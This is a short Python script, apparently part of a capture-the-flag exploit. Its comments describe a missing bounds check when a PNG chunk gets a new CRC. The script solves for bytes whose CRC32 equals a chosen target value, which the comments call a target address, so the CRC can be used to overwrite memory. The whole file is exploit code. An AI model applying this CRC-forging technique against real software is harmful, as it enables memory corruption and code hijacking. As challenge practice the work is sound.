# no bounds check in PNG chunk when writing a new crc
# solve new crc that matches target addr and done

import crcsolver
from itertools import combinations_with_replacement
from tqdm import tqdm
from binascii import crc32

data_orig = bytes.fromhex("00000301010018dd8db00000000049454e44ae4260820000002100000000000000d713400000000000ea14400000000000") # 6b at begin to control
data = b'IDAT______'+bytes([~b&0xff for b in data_orig])

d = crcsolver.solve(data,range(8*4, 8*10), 0x14181814, crc32)
print(d.hex(), hex(crc32(d)))
print(bytes([~b&0xff for b in d[4:10]]).hex())
